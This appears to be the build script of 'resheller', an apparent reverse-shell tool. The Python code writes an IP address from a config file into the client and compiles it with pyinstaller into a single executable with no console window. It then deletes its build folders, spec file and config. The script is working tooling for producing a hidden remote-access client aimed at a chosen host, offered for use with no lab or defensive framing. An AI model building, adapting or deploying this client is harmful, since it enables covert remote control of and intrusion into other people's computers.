import sys
from configparser import ConfigParser
from ipaddress import IPv4Address
from os import path, name, remove, rename
from shutil import copyfile, rmtree
from subprocess import Popen, PIPE, STDOUT, call, DEVNULL
from textwrap import wrap

from root_finder import get_project_root

from resheller.lib.stdout import color


class Build:
    """Call to resolve config paths and create uninitiated configs"""

    def __init__(self) -> None:
        self.executed = False
        self.install = True
        self.venv = hasattr(sys, 'real_prefix')
        self.repo = get_project_root("resheller")
        self.client = "client.exe" if name == "nt" else "client"
        self.conf_ini = path.join(self.repo, 'config.ini')
        self.package = path.join(self.repo, "resheller")
        self._build = path.join(self.repo, "build")
        self.dist = path.join(self.repo, "dist")
        self.client_exe = path.join(self.dist, self.client)
        self.setup = path.join(self.repo, "setup.py")

    def write_ip_file(self, ip: str) -> None:
        ip_file = path.join(self.package, "src", "client", "ip.py")
        with open(ip_file, "w") as file:
            file.write("#!/usr/bin/env python3\n")
            file.write("def get_ip():\n\n\n")
            file.write(f"    return {ip}\n")

    def run_pip(self, args: list) -> None:
        cmd = [sys.executable, "-m", "pip"]
        for arg in args:
            cmd.append(arg)
        self.run_command(cmd)

    def run_command(self, cmd: list) -> None:
        proc = Popen(cmd, stdout=PIPE, stderr=STDOUT, encoding='utf8')
        stdout, _ = proc.communicate()
        for line in stdout.splitlines():
            for row in wrap(line, 75):
                print(f"  {row}")
                self.executed = True

    def make_config(self) -> None:
        def_ini = path.join(self.package, "lib", 'default.ini')
        copyfile(def_ini, self.conf_ini)
        color.grn.print("Initiated config.ini:")
        color.ylw.print("  Enter target's IP in config then run ./install")
        exit(0)

    def get_ip(self) -> None:
        config = ConfigParser()
        config.read(self.conf_ini)
        ipv4 = config["IP"]["server"]
        try:
            IPv4Address(ipv4.strip('"'))
        except ValueError as err:
            if "Enter target IP here" in ipv4:
                prompt = "  Enter target's IP in the config file (config.ini)"
                color.red.print(prompt)
            else:
                color.b_red.print("  Not a valid IPv4 Address:")
                color.b_red.print(f"  {err}")
            exit(0)
        self.write_ip_file(ipv4)

    def make_exe(self) -> None:
        client = path.join(self.repo, "resheller", "client.py")
        cmd = ["pyinstaller", "--onefile", "--noconsole", client]
        self.run_command(cmd)
        color.ylw.print("  Installation Successful")
        print()

    def separate_exe(self):
        client_src = path.join("dist", self.client)
        rename(client_src, self.client)
        sys.stdout = open(path.devnull, "w")
        rmtree("build")
        rmtree("dist")
        remove("client.spec")
        remove(self.conf_ini)

    def setup_py(self):
        color.grn.print("Running setup.py install")
        cmd = f"python3 {self.setup} install"
        call(cmd, stdout=DEVNULL, stderr=DEVNULL, shell=True)


def main() -> None:
    color.b_grn.print("[Building]")
    build = Build()
    build.setup_py()
    if not path.isfile(build.conf_ini):
        build.make_config()
    build.get_ip()
    color.grn.print("Building Package:")
    build.make_exe()
    build.separate_exe()
